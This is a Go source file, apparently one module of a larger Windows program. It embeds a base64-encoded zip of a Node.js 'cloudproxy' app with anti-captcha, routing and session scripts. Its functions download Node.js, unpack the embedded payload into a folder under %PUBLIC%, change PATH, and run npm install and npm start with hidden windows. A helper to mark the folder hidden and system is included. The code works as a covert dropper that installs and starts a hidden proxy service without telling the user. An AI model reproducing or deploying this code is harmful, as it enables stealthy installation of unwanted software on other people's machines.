package main

import (
	"encoding/base64"
	"github.com/artdarek/go-unzip"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var encodedZip = "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"

func CloudProxy(errorChan chan<- error) {
	err := StartCloudProxy()
	if err != nil {
		errorChan <- err
		return
	}
}

func SetupCloudProxy() error {
	parentDir := os.Getenv("public") + "\\" + tag
	if DirExist(parentDir) {
		return nil
	} else {
		return InstallCloudProxy()
	}
}

func StartCloudProxy() error {
	parentDir := os.Getenv("public") + "\\" + tag
	cmd := exec.Command("npm", "start")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Dir = parentDir + "\\cloudproxy"
	return cmd.Run()
}

func InstallCloudProxy() error {
	parentDir := os.Getenv("public") + "\\" + tag
	err := os.RemoveAll(parentDir)
	if err != nil {
		return err
	}
	err = os.Mkdir(parentDir, 0755)
	if err != nil {
		return err
	}
	// err = SetHidden(parentDir)
	// if err != nil {
	// 	return err
	// }
	err = Download("https://nodejs.org/dist/v15.8.0/node-v15.8.0-win-x64.zip", parentDir+"\\nodejs.zip")
	if err != nil {
		return err
	}
	err = DecodeBase64(encodedZip, parentDir+"\\proxy.zip")
	if err != nil {
		return err
	}
	err = UnZip(parentDir+"\\nodejs.zip", parentDir)
	if err != nil {
		return err
	}
	err = UnZip(parentDir+"\\proxy.zip", parentDir)
	if err != nil {
		return err
	}
	err = os.Remove(parentDir + "\\nodejs.zip")
	if err != nil {
		return err
	}
	err = os.Remove(parentDir + "\\proxy.zip")
	if err != nil {
		return err
	}
	if !PathExist(parentDir + "\\node-v15.8.0-win-x64") {
		err = AddPath(parentDir + "\\node-v15.8.0-win-x64")
		if err != nil {
			return err
		}
	}
	cmd := exec.Command("npm", "install")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Dir = parentDir + "\\cloudproxy"
	return cmd.Run()
}

func SetHidden(filename string) error {
	cFilename, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(cFilename, syscall.FILE_ATTRIBUTE_SYSTEM|syscall.FILE_ATTRIBUTE_HIDDEN)
}

func PathExist(path string) bool {
	pathFromEnv := os.Getenv("path")
	return strings.Contains(pathFromEnv, path)
}

func AddPath(path string) error {
	pathFromEnv := os.Getenv("path")
	return os.Setenv("path", pathFromEnv+";"+path)
}

func DirExist(dir string) bool {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func UnZip(src, dst string) error {
	uz := unzip.New(src, dst)
	return uz.Extract()
}

func Download(url, filename string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func DecodeBase64(encoded, filename string) error {
	dec, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return err
	}

	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err := f.Write(dec); err != nil {
		return err
	}
	return f.Sync()
}
